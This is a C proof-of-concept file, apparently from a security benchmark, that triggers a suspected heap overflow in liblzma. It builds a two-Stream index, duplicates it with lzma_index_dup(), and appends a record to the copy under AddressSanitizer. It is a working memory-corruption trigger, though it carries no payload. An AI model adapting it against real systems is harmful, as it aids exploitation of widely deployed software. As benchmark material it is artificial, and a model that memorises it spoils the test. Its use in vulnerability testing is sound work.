// SPDX-License-Identifier: 0BSD

// PoC for the security-benchmark test case.
//
// Builds a two-Stream lzma_index (CRC64 + CRC32) through the public API,
// duplicates it with lzma_index_dup(), and then appends one Record to
// the duplicate. lzma_index_append() after lzma_index_dup() is supported
// usage (see the comment in lzma_index_prealloc() in index.c).
//
// Build:
//     cc -fsanitize=address -g -O1 -I src/liblzma/api \
//        pocs/dup_append_overflow.c <path-to-liblzma> -lpthread -lm \
//        -o /tmp/dup_append_overflow
// Run:
//     ASAN_OPTIONS=abort_on_error=1 /tmp/dup_append_overflow

#include "lzma.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// Smallest valid Unpadded Size (UNPADDED_SIZE_MIN in liblzma).
#define UNPADDED_MIN 5


static lzma_index *
make_stream(lzma_check check)
{
	lzma_index *idx = lzma_index_init(NULL);
	if (idx == NULL) {
		fprintf(stderr, "lzma_index_init failed\n");
		exit(1);
	}

	lzma_stream_flags flags;
	memset(&flags, 0, sizeof(flags));
	flags.version = 0;
	flags.backward_size = LZMA_VLI_UNKNOWN;
	flags.check = check;

	if (lzma_index_stream_flags(idx, &flags) != LZMA_OK) {
		fprintf(stderr, "lzma_index_stream_flags failed\n");
		exit(1);
	}

	// One Block in this Stream.
	if (lzma_index_append(idx, NULL, UNPADDED_MIN, 10) != LZMA_OK) {
		fprintf(stderr, "lzma_index_append failed\n");
		exit(1);
	}

	return idx;
}


int
main(void)
{
	// Make the prints visible even if the run aborts.
	setvbuf(stdout, NULL, _IONBF, 0);

	// Two Streams with different Check types.
	lzma_index *first = make_stream(LZMA_CHECK_CRC64);
	lzma_index *second = make_stream(LZMA_CHECK_CRC32);

	// Concatenate into a single multi-Stream Index.
	if (lzma_index_cat(first, second, NULL) != LZMA_OK) {
		fprintf(stderr, "lzma_index_cat failed\n");
		return 1;
	}

	printf("lzma_index_checks(original) = 0x%x\n",
			(unsigned)lzma_index_checks(first));

	// Duplicate the whole Index.
	lzma_index *copy = lzma_index_dup(first, NULL);
	if (copy == NULL) {
		fprintf(stderr, "lzma_index_dup failed\n");
		return 1;
	}

	printf("lzma_index_checks(duplicate) = 0x%x\n",
			(unsigned)lzma_index_checks(copy));

	// The duplicate is a fully valid Index. Appending to it must work
	// the same way as appending to the original.
	lzma_ret ret = lzma_index_append(copy, NULL, UNPADDED_MIN, 1);
	printf("lzma_index_append(duplicate) = %d\n", (int)ret);

	lzma_index_end(copy, NULL);
	lzma_index_end(first, NULL);

	printf("no crash\n");
	return 0;
}
